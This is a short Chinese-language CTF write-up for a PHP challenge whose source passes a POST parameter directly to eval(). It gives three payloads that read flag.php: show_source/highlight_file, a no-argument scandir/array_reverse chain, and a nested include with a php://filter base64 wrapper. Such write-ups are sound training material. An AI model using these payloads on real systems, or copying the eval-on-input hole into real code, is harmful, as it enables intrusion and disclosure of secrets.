```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

依旧同上题



首先尝试system，exec等函数

失败





### 第一种

利用show_source()读取源码

```
c=show_source("flag.php");
```

![image-20250404151313018](./assets/image-20250404151313018.png)



利用highlight_file()读取源码

```
c=highlight_file("flag.php");
```

![image-20250404151352906](./assets/image-20250404151352906.png)



尝试readfile()失败





### 第二种

参考无参rce

前几篇给出了分析过程，这里直接贴payload了

```
c=var_dump(scandir(getcwd()));
```

![image-20250404151618015](./assets/image-20250404151618015.png)

```
c=highlight_file(next(array_reverse(scandir(getcwd()))));
```

![image-20250404151554919](./assets/image-20250404151554919.png)





### 第三种

嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250404151729529](./assets/image-20250404151729529.png)

![image-20250404151744875](./assets/image-20250404151744875.png)